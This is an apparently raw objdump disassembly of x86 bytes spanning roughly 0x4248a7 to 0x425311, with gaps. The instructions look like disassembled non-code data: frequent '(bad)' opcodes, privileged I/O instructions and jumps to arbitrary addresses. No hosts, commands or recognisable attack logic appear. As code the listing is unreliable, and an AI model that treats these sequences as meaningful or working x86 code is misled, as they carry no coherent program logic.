  4248a7:	test   al,0xdb
  4248a9:	into   
  4248aa:	cmp    al,0x67
  4248ac:	xchg   BYTE PTR [ebp+0x2],cl
  4248af:	jne    0x4248ba
  4248b1:	cld    
  4248b2:	mov    edx,DWORD PTR [edx]
  4248b4:	lds    edx,FWORD PTR [edi+0x296d2e12]
  4248ba:	(bad)  
  4248bb:	mov    al,0xd2
  4248bd:	retf   
  4248be:	sub    ah,dl
  4248c0:	loopne 0x4248ad
  4248c2:	in     al,dx
  4248c3:	adc    eax,0x5674a56c
  4248c8:	idiv   edx
  4248ca:	xor    eax,0x53df2689
  4248cf:	lahf   
  4248d0:	jg     0x424867
  4248d2:	mov    ds:0xe4bd2a1c,eax
  4248d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248d8:	xor    edi,DWORD PTR [ebp-0x75]
  4248db:	dec    edi
  4248dc:	mov    ds:0x62a57bb5,eax
  4248e1:	out    0x54,al
  4248e3:	test   eax,0xf6921b59
  4248e8:	push   0xfc272f75
  4248ed:	xchg   esi,eax
  4248ee:	cli    
  4248ef:	push   ecx
  4248f0:	scas   eax,DWORD PTR es:[edi]
  4248f1:	call   0xa8f4a74
  4248f6:	adc    ebx,DWORD PTR [esi-0x46]
  4248f9:	pop    ebp
  4248fa:	mov    bh,0x63
  4248fc:	hlt    
  4248fd:	inc    edi
  4248fe:	(bad)  
  4248ff:	pop    ebp
  424900:	jg     0x424902
  424902:	in     al,0x2c
  424904:	mov    al,0x63
  424906:	xchg   edx,eax
  424907:	icebp  
  424908:	push   esp
  424909:	xlat   BYTE PTR ds:[ebx]
  42490a:	adc    eax,DWORD PTR [esi]
  42490c:	xor    eax,0xe06de14d
  424911:	int3   
  424912:	sub    eax,0x709bd100
  424917:	adc    esi,DWORD PTR [edx]
  424919:	jle    0x4248be
  42491b:	mov    edx,0xb99cac38
  424920:	or     DWORD PTR ss:[ebx-0x6b],esi
  424924:	and    ecx,DWORD PTR [edi+0x676a2942]
  42492a:	arpl   WORD PTR [eax+0x461fb7cf],sp
  424930:	adc    eax,DWORD PTR [ebp-0x37]
  424933:	jae    0x4249a5
	...
  424995:	add    BYTE PTR [ebx+0x18],ch
  424998:	arpl   WORD PTR [edx+0x73],bp
  42499b:	jnp    0x424a08
  42499d:	sbb    ebp,eax
  42499f:	adc    eax,0x7956bac2
  4249a4:	and    ebp,DWORD PTR [ebx+ecx*8-0x7b]
  4249a8:	add    DWORD PTR [eax],eax
  4249aa:	pop    es
  4249ab:	add    DWORD PTR [eax],eax
  4249ad:	add    BYTE PTR [ebx+0x3c1a6466],al
  4249b3:	jl     0x4249e2
  4249b5:	ret    
  4249b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249b7:	out    0xa3,al
  4249b9:	sbb    al,0x2c
  4249bb:	push   ecx
  4249bc:	in     al,dx
  4249bd:	mov    ah,0x2f
  4249bf:	push   ebx
  4249c0:	dec    ebx
  4249c1:	shl    DWORD PTR [ecx-0x10],1
  4249c4:	inc    edx
  4249c5:	pop    edi
  4249c6:	popa   
  4249c7:	jl     0x424993
  4249c9:	dec    esp
  4249ca:	sub    cl,BYTE PTR [ebp+0x2ea19082]
  4249d0:	pop    esi
  4249d1:	xor    eax,0xe7621f9
  4249d6:	cwde   
  4249d7:	iret   
  4249d8:	jmp    FWORD PTR [edi-0x6f]
  4249db:	lds    eax,FWORD PTR [ebp-0x133570b4]
  4249e1:	pop    esi
  4249e2:	inc    esi
  4249e3:	pop    edi
  4249e4:	dec    eax
  4249e5:	loope  0x4249fa
  4249e7:	rol    esi,0x17
  4249ea:	push   ss
  4249eb:	push   cs
  4249ec:	ja     0x424a3d
  4249ee:	icebp  
  4249ef:	jns    0x42499f
  4249f1:	popf   
  4249f2:	rcr    BYTE PTR [ebx],0x95
  4249f5:	dec    esp
  4249f6:	daa    
  4249f7:	push   esp
  4249f8:	jmp    DWORD PTR [edi-0x3d9c9ca7]
  4249fe:	cli    
  4249ff:	in     al,dx
  424a00:	imul   ecx,DWORD PTR [eax+0x7d14d848],0x67a9e4e1
  424a0a:	add    DWORD PTR [ebx+0x2c],esp
  424a0d:	mov    eax,0xa670f10c
  424a12:	scas   al,BYTE PTR es:[edi]
  424a13:	push   esp
  424a14:	cmp    al,0x91
  424a16:	mov    edx,0x6cbb25f1
  424a1b:	jbe    0x424a6e
  424a1d:	sbb    eax,esp
  424a1f:	fsub   QWORD PTR [edi]
  424a21:	test   BYTE PTR [esi],ch
  424a23:	(bad)  
  424a24:	cli    
  424a25:	mov    eax,0xebe1279c
  424a2a:	(bad)
  424a2e:	add    edi,DWORD PTR [ebx]
  424a30:	or     al,0x2e
  424a32:	inc    edi
  424a33:	push   ss
  424a34:	add    al,0xc
  424a36:	aam    0x28
  424a38:	sub    al,0x5d
  424a3a:	inc    ebx
  424a3b:	add    eax,0xeb4a6903
  424a40:	cmp    bh,BYTE PTR [edx]
  424a42:	out    0xec,eax
  424a44:	adc    BYTE PTR [ebp-0x19],0xa5
  424a48:	cmp    al,0x68
  424a4a:	and    al,dh
  424a4c:	inc    esi
  424a4d:	call   0x3b836485
  424a52:	mov    ds:0x57cf768a,eax
  424a57:	cmp    al,0x8f
  424a59:	cmp    ah,dl
  424a5b:	inc    ecx
  424a5c:	mov    al,0x3d
  424a5e:	or     BYTE PTR [ecx-0x76283e6e],0xfa
  424a65:	arpl   WORD PTR ds:0xe13219ff,ax
  424a6b:	and    BYTE PTR gs:[edx],0x27
  424a6f:	mov    bl,BYTE PTR [ebx+0xd]
  424a72:	mov    gs,WORD PTR [esi+0x4d]
  424a75:	data16 ds mov dh,0xdb
  424a79:	js     0x424a2a
  424a7b:	mov    ah,0x53
  424a7d:	test   DWORD PTR [edx-0x21aa7d42],esp
  424a83:	fnclex 
  424a85:	gs mov edi,0xa869dbdf
  424a8b:	lods   al,BYTE PTR ds:[esi]
  424a8c:	call   0x1b08:0x5603357a
  424a93:	fdivr  st,st(7)
  424a95:	sbb    edi,DWORD PTR [esi]
  424a97:	xchg   DWORD PTR [eax],edx
  424a99:	stc    
  424a9a:	adc    bl,dh
  424a9c:	sub    eax,0x7c73cd3b
  424aa1:	mov    ch,ch
  424aa3:	rol    cl,1
  424aa5:	dec    esi
  424aa6:	cmp    BYTE PTR [esi+0x35f26efa],ah
  424aac:	scas   al,BYTE PTR es:[edi]
  424aad:	test   DWORD PTR [ecx+eax*2+0x51a71a65],edi
  424ab4:	outs   dx,DWORD PTR ds:[esi]
	...
  424b15:	add    BYTE PTR [esi],al
  424b17:	aas    
  424b18:	or     eax,0xb6bb3db9
  424b1d:	mov    edi,0x1cbed53b
  424b22:	lds    ebp,FWORD PTR [edi-0x792df479]
  424b28:	add    DWORD PTR [eax],eax
  424b2a:	pop    es
  424b2b:	add    DWORD PTR [eax],eax
  424b2d:	add    BYTE PTR [edx],dl
  424b2f:	call   0xe2abdf64
  424b34:	loop   0x424b74
  424b36:	test   eax,0x4f0f3e1f
  424b3b:	mov    BYTE PTR [edx],ah
  424b3d:	xchg   esp,eax
  424b3e:	das    
  424b3f:	jnp    0x424b1d
  424b41:	or     BYTE PTR [edi+ebx*2+0x52e7f1a4],0x5f
  424b49:	add    eax,0x3c70d458
  424b4e:	es mov eax,0x6169d326
  424b54:	aas    
  424b55:	add    DWORD PTR [ebx-0x1d],esp
  424b58:	jle    0x424b96
  424b5a:	push   ss
  424b5b:	dec    ebp
  424b5c:	xchg   DWORD PTR [eax],ecx
  424b5e:	pop    esi
  424b5f:	and    al,0x28
  424b61:	and    bl,ch
  424b63:	add    eax,0x994f0827
  424b68:	mov    ah,BYTE PTR [ebp+0x0]
  424b6b:	jmp    DWORD PTR [ebp+0xd]
  424b6e:	adc    al,0xb2
  424b70:	inc    ebx
  424b71:	in     al,0x3e
  424b73:	cli    
  424b74:	pop    esp
  424b75:	shr    ah,cl
  424b77:	inc    ebp
  424b78:	inc    ebp
  424b79:	das    
  424b7a:	add    al,0x98
  424b7c:	push   ebp
  424b7d:	pop    ss
  424b7e:	gs jl  0x424b36
  424b81:	ror    BYTE PTR [esi+0x3d],cl
  424b84:	jo     0x424bed
  424b86:	mov    dh,0xc9
  424b88:	lods   al,BYTE PTR ds:[esi]
  424b89:	sub    al,0xb9
  424b8b:	daa    
  424b8c:	fwait
  424b8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b8e:	pushf  
  424b8f:	xchg   ecx,eax
  424b90:	mov    dl,0x3
  424b92:	nop
  424b93:	rcl    eax,cl
  424b95:	mov    ds:0x938344b9,al
  424b9a:	jmp    0x424b8b
  424b9c:	cmp    cl,cl
  424b9e:	cmp    BYTE PTR [ebp-0x6069208],0xcc
  424ba5:	cmc    
  424ba6:	mov    WORD PTR [ebx-0x27],gs
  424ba9:	inc    ebp
  424baa:	lea    ebp,[ecx-0x77]
  424bad:	pop    es
  424bae:	or     dh,BYTE PTR [ecx+0x4493721f]
  424bb4:	xchg   BYTE PTR [ecx-0x365f943],dh
  424bba:	lahf   
  424bbb:	jns    0x424b7f
  424bbd:	xor    BYTE PTR [eax-0x5d0704fa],bh
  424bc3:	fmul   st(1),st
  424bc5:	add    cl,al
  424bc7:	call   0x459e:0xcd8bd2b9
  424bce:	mov    esp,0xd828aac3
  424bd3:	add    al,0x89
  424bd5:	cmc    
  424bd6:	dec    ecx
  424bd7:	mov    edx,0xd5b94f3f
  424bdc:	pop    edi
  424bdd:	gs test eax,esp
  424be0:	in     eax,0xad
  424be2:	cld    
  424be3:	loopne 0x424be1
  424be5:	push   esp
  424be6:	loop   0x424c32
  424be8:	das    
  424be9:	cmc    
  424bea:	and    dh,BYTE PTR [esi+0x6f400224]
  424bf0:	mov    edx,0x77dfc306
  424bf5:	fimul  WORD PTR [eax]
  424bf7:	pop    eax
  424bf8:	shl    DWORD PTR [edx-0x5e],cl
  424bfb:	cmp    eax,0xfda70303
  424c00:	fisubr DWORD PTR ds:0x85833f5
  424c06:	adc    al,0x80
  424c08:	sbb    edi,ebp
  424c0a:	push   ecx
  424c0b:	adc    DWORD PTR [ecx+esi*4-0x1d],esp
  424c0f:	mov    ch,0x78
  424c11:	sbb    ebp,DWORD PTR [esi+0x5a]
  424c14:	mov    al,ds:0x224b0136
  424c19:	lods   eax,DWORD PTR ds:[esi]
  424c1a:	sahf   
  424c1b:	xchg   ebx,eax
  424c1c:	std    
  424c1d:	mov    esi,DWORD PTR [ebx+0xb]
  424c20:	cli    
  424c21:	mov    dl,0xdd
  424c23:	cmp    al,0xae
  424c25:	retf   
  424c26:	cmp    bh,BYTE PTR [ebp+ebp*1+0x2]
  424c2a:	mov    edi,0xc37e3e39
  424c2f:	push   esi
  424c30:	push   ds
  424c31:	out    dx,eax
  424c32:	pop    ebx
  424c33:	icebp  
  424c34:	fiadd  DWORD PTR [eax]
	...
  424c96:	ins    BYTE PTR es:[edi],dx
  424c97:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424c9e:	sub    eax,0x7e588c09
  424ca3:	jp     0x424c8a
  424ca5:	adc    ecx,ebx
  424ca7:	xchg   DWORD PTR [ecx],eax
  424ca9:	add    BYTE PTR [edi],al
  424cab:	add    DWORD PTR [eax],eax
  424cad:	add    BYTE PTR [ecx+0x1c6eaded],dh
  424cb3:	mov    ecx,0x6b62f562
  424cb8:	scas   eax,DWORD PTR es:[edi]
  424cb9:	push   ss
  424cba:	xchg   edi,eax
  424cbb:	adc    bh,BYTE PTR [esi]
  424cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424cbe:	and    DWORD PTR [eax-0x67e9c9f3],0xc4d52986
  424cc8:	pop    esp
  424cc9:	pop    es
  424cca:	cmp    eax,0xcee48d27
  424ccf:	arpl   WORD PTR [ebx+0x5f],bp
  424cd2:	lods   eax,DWORD PTR ds:[esi]
  424cd3:	int3   
  424cd4:	retf   0xb542
  424cd7:	outs   dx,DWORD PTR ds:[esi]
  424cd8:	(bad)  
  424cd9:	shr    ecx,1
  424cdb:	sbb    BYTE PTR [ebx+0x1a],0xdb
  424cdf:	jl     0x424cbb
  424ce1:	add    ecx,esp
  424ce3:	jg     0x424d51
  424ce5:	push   ebx
  424ce6:	out    dx,al
  424ce7:	outs   dx,DWORD PTR ds:[esi]
  424ce8:	rol    DWORD PTR [ebx-0x5e],0xc7
  424cec:	xchg   esp,eax
  424ced:	sbb    al,0xb
  424cef:	int    0x2
  424cf1:	push   0xffffffee
  424cf3:	and    al,0x24
  424cf5:	jmp    0x424cf9
  424cf7:	nop
  424cf8:	sub    BYTE PTR [ecx-0x19],bl
  424cfb:	sar    DWORD PTR [esi-0x50035b00],cl
  424d01:	mov    ?,WORD PTR [edx-0x19]
  424d04:	push   ecx
  424d05:	scas   eax,DWORD PTR es:[edi]
  424d06:	jns    0x424d79
  424d08:	and    eax,0xb5deaaf0
  424d0d:	sub    DWORD PTR ds:0x1f5dfaf9,esp
  424d13:	sar    BYTE PTR [ebx+0x51889ad9],0xbb
  424d1a:	push   ds
  424d1b:	leave  
  424d1c:	push   esp
  424d1d:	jno    0x424d1f
  424d1f:	cld    
  424d20:	xor    eax,DWORD PTR [esi-0x25a56d43]
  424d26:	xor    ebp,ebx
  424d28:	(bad)  
  424d29:	and    eax,0xf0254729
  424d2e:	enter  0xb527,0x13
  424d32:	test   al,0x5c
  424d34:	dec    eax
  424d35:	stos   DWORD PTR es:[edi],eax
  424d36:	pusha  
  424d37:	test   DWORD PTR [esi-0x7182910],ebx
  424d3d:	pusha  
  424d3e:	adc    eax,0x89a70e4
  424d43:	(bad)  
  424d45:	nop
  424d46:	aad    0x2d
  424d48:	call   0x331682fe
  424d4d:	mov    ah,0x8b
  424d4f:	jge    0x424d4c
  424d51:	bound  eax,QWORD PTR [ecx-0x20b0ef38]
  424d57:	mov    ah,0x4f
  424d59:	jmp    0xfd207723
  424d5e:	add    al,0x2b
  424d60:	ficomp DWORD PTR [ecx+0x52cb226c]
  424d66:	and    al,0x38
  424d68:	out    0xfd,eax
  424d6a:	ins    DWORD PTR es:[edi],dx
  424d6b:	fstp   DWORD PTR [ebx-0x74355ec3]
  424d71:	jmp    0x31596948
  424d76:	sbb    DWORD PTR [ebp-0x12],edx
  424d79:	mov    al,0x2a
  424d7b:	xlat   BYTE PTR ds:[ebx]
  424d7c:	mov    ds:0x82829a99,eax
  424d81:	popf   
  424d82:	add    edi,DWORD PTR [edi-0x32]
  424d85:	push   es
  424d86:	push   ds
  424d87:	jnp    0x424e04
  424d89:	adc    DWORD PTR [edx+eax*8],ebp
  424d8c:	inc    esi
  424d8d:	push   ss
  424d8e:	sub    eax,0x74c1c0b5
  424d93:	imul   esp,esp,0x89a5e527
  424d99:	lods   eax,DWORD PTR ds:[esi]
  424d9a:	adc    eax,DWORD PTR ds:0xae72588c
  424da0:	repnz push esp
  424da2:	or     eax,0x48c9ff28
  424da7:	inc    edi
  424da8:	and    al,dh
  424daa:	mov    ds:0xab1077ab,al
  424daf:	push   ss
  424db0:	neg    DWORD PTR [edx]
  424db2:	shl    BYTE PTR [esi-0x2],cl
	...
  424e15:	add    BYTE PTR ds:0xf361d20c,bh
  424e1b:	(bad)  
  424e1c:	mov    edi,0xb8b3635c
  424e21:	xchg   ebx,edx
  424e23:	in     al,0x61
  424e25:	add    eax,esp
  424e27:	mov    BYTE PTR [ecx],al
  424e29:	add    BYTE PTR [edi],al
  424e2b:	add    DWORD PTR [eax],eax
  424e2d:	add    BYTE PTR [edx-0x3ca5c52d],bh
  424e33:	inc    ebp
  424e34:	fmul   QWORD PTR [esi+0x4e90fd5a]
  424e3a:	inc    esp
  424e3b:	dec    ebp
  424e3c:	inc    edi
  424e3d:	xor    DWORD PTR [esi],eax
  424e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e40:	in     eax,dx
  424e41:	mov    ebx,DWORD PTR [ebx]
  424e43:	pushf  
  424e44:	push   ebp
  424e45:	popa   
  424e46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e47:	xchg   edi,eax
  424e48:	add    esp,ebx
  424e4a:	fnstcw WORD PTR [ebp+0x2cc940ec]
  424e50:	xor    al,0xad
  424e52:	xchg   edi,eax
  424e53:	gs sbb al,0xbc
  424e56:	sbb    DWORD PTR ds:0xe2308ba6,ebp
  424e5c:	push   esp
  424e5d:	lahf   
  424e5e:	pop    ecx
  424e5f:	cli    
  424e60:	sbb    bl,dh
  424e62:	sti    
  424e63:	pop    ebx
  424e64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e65:	cli    
  424e66:	mov    ch,0x89
  424e68:	fadd   QWORD PTR [esp+esi*1+0x6e59b4f0]
  424e6f:	add    ebp,DWORD PTR ds:0x2b3f4ba9
  424e75:	daa    
  424e76:	aas    
  424e77:	xor    al,0x9b
  424e79:	mov    ds:0x9916b7ac,eax
  424e7e:	or     BYTE PTR [edx],dl
  424e80:	push   ebp
  424e81:	dec    esi
  424e82:	lahf   
  424e83:	jmp    0xbf162498
  424e88:	push   0xe
  424e8a:	mov    ecx,0x3a492a45
  424e8f:	aad    0xd4
  424e91:	jecxz  0x424ea6
  424e93:	ss enter 0x393a,0x36
  424e98:	dec    ecx
  424e99:	mov    edi,0xee51ed3
  424e9e:	dec    BYTE PTR [edx]
  424ea0:	sub    BYTE PTR [ecx+0x5d],0xba
  424ea4:	dec    ecx
  424ea5:	call   0xaf6c:0x66a9c38
  424eac:	dec    ebx
  424ead:	or     al,0xb4
  424eaf:	push   esi
  424eb0:	mov    ch,0x8b
  424eb2:	not    DWORD PTR [edx+eiz*2]
  424eb5:	fcmovbe st,st(2)
  424eb7:	xor    al,0x54
  424eb9:	xor    eax,0xebf136c0
  424ebe:	lds    esp,FWORD PTR [ecx+edx*1-0x64acda2d]
  424ec5:	cmp    al,0xb5
  424ec7:	dec    ecx
  424ec8:	js     0x424ead
  424eca:	cli    
  424ecb:	out    0x57,eax
  424ecd:	pop    esp
  424ece:	mov    al,0x63
  424ed0:	sbb    ecx,DWORD PTR [eax]
  424ed2:	cmp    ebx,DWORD PTR [ebx]
  424ed4:	cmp    al,0x5
  424ed6:	fxch   st(1)
  424ed8:	cdq    
  424ed9:	bound  edx,QWORD PTR [eax-0x37]
  424edc:	int3   
  424edd:	add    eax,0x2f6fac7f
  424ee2:	lahf   
  424ee3:	mov    edi,0xb60fee13
  424ee8:	push   esp
  424ee9:	dec    esp
  424eea:	mov    WORD PTR [edi-0x57fb350b],fs
  424ef0:	jns    0x424f5f
  424ef2:	into   
  424ef3:	push   edx
  424ef4:	adc    BYTE PTR [ecx-0x45172f7],bl
  424efa:	mov    WORD PTR [esi+edi*1+0x6c],es
  424efe:	sub    dl,BYTE PTR [ecx-0x718e52f1]
  424f04:	push   edx
  424f05:	push   sp
  424f07:	pop    edx
  424f08:	jg     0x424ee0
  424f0a:	jae    0x424f84
  424f0c:	dec    edi
  424f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f0e:	pop    ebp
  424f0f:	cwde   
  424f10:	outs   dx,DWORD PTR ds:[esi]
  424f11:	add    al,0x5b
  424f13:	dec    edx
  424f14:	pop    edi
  424f15:	ja     0x424edf
  424f17:	cwde   
  424f18:	out    0x28,eax
  424f1a:	jmp    0x47e9:0x854b4949
  424f21:	or     al,BYTE PTR [edx+0x4331aa04]
  424f27:	inc    edi
  424f28:	mov    WORD PTR [esp+ecx*4+0x46],ds
  424f2c:	mov    dh,0x73
  424f2e:	push   0x198ad0d8
  424f33:	int    0xe2
	...
  424f95:	add    BYTE PTR [ebx+0x16],cl
  424f98:	int    0x41
  424f9a:	fstp   st(3)
  424f9c:	iret   
  424f9d:	push   ds
  424f9e:	xor    al,0x88
  424fa0:	ror    BYTE PTR [eax-0x20d73ed8],1
  424fa6:	out    0x89,eax
  424fa8:	add    DWORD PTR [eax],eax
  424faa:	pop    es
  424fab:	add    DWORD PTR [eax],eax
  424fad:	add    dl,cl
  424faf:	or     BYTE PTR [edx+ebp*4],al
  424fb2:	and    DWORD PTR [ecx+0x44],ebx
  424fb5:	(bad)  [edx-0x3a]
  424fb8:	imul   edx,DWORD PTR [edi],0x2b
  424fbb:	ret    0x5b7a
  424fbe:	or     eax,0xad87bbd5
  424fc3:	pop    ss
  424fc4:	shr    DWORD PTR [edi],0x3f
  424fc7:	adc    DWORD PTR cs:[eax],edx
  424fca:	add    BYTE PTR [ebx+0x52],bl
  424fcd:	xchg   ebx,eax
  424fce:	dec    ecx
  424fcf:	call   0x3541208c
  424fd4:	jmp    0x8fd2:0xc3987a01
  424fdb:	jle    0x425022
  424fdd:	and    cl,BYTE PTR [edi+0x2a]
  424fe0:	sub    bh,BYTE PTR [edi+esi*8+0x58c496a5]
  424fe7:	or     eax,0xa8dcd754
  424fec:	ins    BYTE PTR es:[edi],dx
  424fed:	enter  0x7832,0x7a
  424ff1:	nop
  424ff2:	les    edi,FWORD PTR [ebx]
  424ff4:	and    eax,0x17af5f00
  424ff9:	mov    ds:0x20c18561,al
  424ffe:	jae    0x424fd4
  425000:	cmc    
  425001:	add    ebp,DWORD PTR [eax+ebx*8+0x42a152c5]
  425008:	into   
  425009:	(bad)  
  42500a:	lock arpl ax,bx
  42500d:	pop    edi
  42500e:	test   al,0x19
  425010:	xchg   esi,eax
  425011:	sar    DWORD PTR [eax],1
  425013:	sub    eax,0x3f8c25e5
  425018:	xchg   ecx,eax
  425019:	into   
  42501a:	mov    ebp,0xbeb690eb
  42501f:	sbb    DWORD PTR [ecx+0x11afab39],ecx
  425025:	and    edi,edi
  425027:	out    0xa2,eax
  425029:	cmp    DWORD PTR [ecx+ecx*1],edi
  42502c:	sti    
  42502d:	add    esp,0x1822323f
  425033:	ror    DWORD PTR [ebx-0x9],0xab
  425037:	add    BYTE PTR [eax+0x62],dh
  42503a:	movq   mm0,QWORD PTR [edx-0x320fd01f]
  425041:	xlat   BYTE PTR ds:[ebx]
  425042:	mov    bh,0x7d
  425044:	aad    0x5d
  425046:	inc    ebx
  425047:	mov    esi,0x7a91eade
  42504c:	and    DWORD PTR [ecx-0x7f],edx
  42504f:	mov    dl,BYTE PTR [ebx]
  425051:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425052:	mov    bl,0xe4
  425054:	retf   
  425055:	sbb    eax,0x14eead72
  42505a:	mov    edi,0x66af0729
  42505f:	sbb    esi,edx
  425061:	mov    esi,0xcb7237f7
  425066:	or     edx,DWORD PTR [ebp+ebx*2+0x4495c7f8]
  42506d:	test   al,0x41
  42506f:	fs jne 0x4250c1
  425072:	test   DWORD PTR ds:0xe2a879e6,edi
  425078:	pop    ebx
  425079:	mov    edi,0x750b2928
  42507e:	inc    esp
  42507f:	out    0x9e,al
  425081:	in     eax,0x33
  425083:	sbb    al,bh
  425085:	nop
  425086:	or     al,BYTE PTR [ebx-0x55d27171]
  42508c:	jg     0x42503d
  42508e:	repz cmp DWORD PTR [ebx-0x571aa115],0xffffff8a
  425096:	or     eax,0x1cbc53fa
  42509b:	retf   
  42509c:	shl    edx,0xba
  42509f:	add    al,0x1e
  4250a1:	icebp  
  4250a2:	dec    edx
  4250a3:	(bad)  
  4250a4:	repz mov ds:0x9f4a0671,al
  4250aa:	xchg   ecx,eax
  4250ab:	enter  0x69cd,0x4d
  4250af:	ins    BYTE PTR es:[edi],dx
  4250b0:	and    eax,0x2caf655f
	...
  425115:	add    dh,bl
  425117:	adc    DWORD PTR [edi-0x15020dd],ebx
  42511d:	std    
  42511e:	and    al,0x47
  425120:	xchg   edi,eax
  425121:	ror    BYTE PTR [eax],cl
  425123:	mov    BYTE PTR [ecx+edi*1],dh
  425126:	out    dx,al
  425127:	mov    al,BYTE PTR [ecx]
  425129:	add    BYTE PTR [edi],al
  42512b:	add    DWORD PTR [eax],eax
  42512d:	add    BYTE PTR [esi-0x57],dl
  425130:	outs   dx,BYTE PTR ds:[esi]
  425131:	and    edi,DWORD PTR ds:0x4c321aca
  425137:	in     eax,0x60
  425139:	add    edx,eax
  42513b:	push   esp
  42513c:	pop    esi
  42513d:	cmp    ebx,edx
  42513f:	loop   0x42517b
  425141:	and    dl,dh
  425143:	jge    0x425175
  425145:	cmp    cl,ah
  425147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425148:	mov    WORD PTR [ecx],?
  42514a:	les    ecx,FWORD PTR ss:[edi+0x75b22697]
  425151:	pushf  
  425152:	mov    ecx,cs
  425154:	jb     0x4251ab
  425156:	adc    edx,0x79
  425159:	arpl   bx,ax
  42515b:	pop    edx
  42515c:	mov    BYTE PTR [ebx+0x47],al
  42515f:	fcom   QWORD PTR ds:0xa46d3713
  425165:	aad    0xa6
  425167:	mov    ecx,0x54c24cbc
  42516c:	mov    ds:0x1d33aae6,eax
  425171:	lea    ebp,ds:0x55f5ef07
  425177:	or     edi,ecx
  425179:	test   al,0x2
  42517b:	jl     0x4251ea
  42517d:	cld    
  42517e:	jnp    0x425183
  425180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425181:	outs   dx,DWORD PTR ds:[esi]
  425182:	jne    0x425124
  425184:	cmp    al,0x80
  425186:	aad    0x82
  425188:	xchg   edx,eax
  425189:	pop    edx
  42518a:	(bad)  
  42518b:	fmul   DWORD PTR ds:0xa39d85ae
  425191:	cmp    ebx,DWORD PTR [edi]
  425193:	mov    cl,0x4e
  425195:	in     al,dx
  425196:	stos   DWORD PTR es:[edi],eax
  425197:	bound  esi,QWORD PTR [edx]
  425199:	inc    edi
  42519a:	dec    esi
  42519b:	push   ecx
  42519c:	pop    ds
  42519d:	cmp    al,0x22
  42519f:	call   0x4e1c:0x97c3f596
  4251a6:	mov    al,0x49
  4251a8:	mov    eax,ds:0x17078960
  4251ad:	lock fimul DWORD PTR [ebx+eax*4+0x31e651ef]
  4251b5:	mov    edi,0xc6ea705f
  4251ba:	and    al,0x78
  4251bc:	xor    al,0xc2
  4251be:	lock adc edi,DWORD PTR fs:[edx+0x5674db4e]
  4251c6:	inc    esi
  4251c7:	sub    BYTE PTR [ebx+0x6929b603],al
  4251cd:	in     eax,dx
  4251ce:	push   ebx
  4251cf:	outs   dx,BYTE PTR ds:[esi]
  4251d0:	push   0xd83c7388
  4251d5:	cmp    BYTE PTR [ecx-0x4f],ch
  4251d8:	ja     0x425187
  4251da:	jns    0x4251a8
  4251dc:	or     BYTE PTR [ebx],bl
  4251de:	push   ecx
  4251df:	add    DWORD PTR [ecx+ebp*4],ebx
  4251e2:	daa    
  4251e3:	das    
  4251e4:	aad    0x5
  4251e6:	pop    ecx
  4251e7:	fdiv   QWORD PTR [edi-0x9b59bd4]
  4251ed:	cld    
  4251ee:	jmp    0x4251c6
  4251f0:	mov    edi,0x4ef47b3a
  4251f5:	fs int 0xcd
  4251f8:	loopne 0x4251bf
  4251fa:	lahf   
  4251fb:	mov    esi,0x2addf0ea
  425200:	hlt    
  425201:	or     bh,BYTE PTR [ebp-0x64]
  425204:	repz cmp eax,0x23c4bee8
  42520a:	test   eax,0x48978aed
  42520f:	mov    ch,0x25
  425211:	or     esp,DWORD PTR [edx]
  425213:	into   
  425214:	jl     0x425268
  425216:	pop    esi
  425217:	ins    BYTE PTR es:[edi],dx
  425218:	pop    edi
  425219:	xor    eax,0x33dfe08e
  42521e:	push   ebp
  42521f:	(bad)  
  425220:	iret   
  425221:	jns    0x425232
  425223:	cmp    ah,dh
  425225:	stos   DWORD PTR es:[edi],eax
  425226:	lock or edi,ebp
  425229:	push   ds
  42522a:	cs jbe 0x425234
  42522d:	inc    esi
  42522e:	add    DWORD PTR [edx],edi
  425230:	lods   eax,DWORD PTR ds:[esi]
  425231:	ret    0xef8d
  425234:	ret    
	...
  425295:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42529c:	mov    ebp,0x2e2083e6
  4252a1:	add    eax,0xb110e674
  4252a6:	cmc    
  4252a7:	mov    eax,DWORD PTR [ecx]
  4252a9:	add    BYTE PTR [edi],al
  4252ab:	add    DWORD PTR [eax],eax
  4252ad:	add    BYTE PTR [esi],ch
  4252af:	mov    edx,0xd744ebd5
  4252b4:	add    DWORD PTR [edx-0xec0aea],esi
  4252ba:	shl    eax,1
  4252bc:	pop    esp
  4252bd:	push   ss
  4252be:	inc    ecx
  4252bf:	pop    esp
  4252c0:	adc    eax,0x79dfe615
  4252c5:	and    eax,0x49d69616
  4252ca:	jg     0x4252bc
  4252cc:	jne    0x4252ad
  4252ce:	dec    eax
  4252cf:	das    
  4252d0:	outs   dx,BYTE PTR ds:[esi]
  4252d1:	pusha  
  4252d2:	jnp    0x42529a
  4252d4:	icebp  
  4252d5:	dec    edi
  4252d6:	pushf  
  4252d7:	xchg   DWORD PTR [edi],esi
  4252d9:	cld    
  4252da:	xor    edi,0xffffffbc
  4252dd:	not    BYTE PTR [esi+0x5a625291]
  4252e3:	push   ss
  4252e4:	jns    0x42534b
  4252e6:	lods   al,BYTE PTR ds:[esi]
  4252e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252e8:	sbb    eax,0x3c1f0363
  4252ed:	jp     0x425365
  4252ef:	push   es
  4252f0:	jmp    0x4252ef
  4252f2:	imul   ebp,DWORD PTR [ebx-0x4e],0x55
  4252f6:	fnstsw WORD PTR [ecx+0x38ba90fb]
  4252fc:	int3   
  4252fd:	xlat   BYTE PTR ds:[ebx]
  4252fe:	(bad)  
  4252ff:	aas    
  425300:	mov    dh,0xb
  425302:	jo     0x425355
  425304:	cmp    bh,0xea
  425307:	imul   ebx,DWORD PTR [ecx+edi*8-0x18],0x12
  42530c:	test   dl,cl
  42530e:	dec    eax
  42530f:	xor    al,cl
  425311:	adc    BYTE PTR [eax-0x71b64396],0x2e
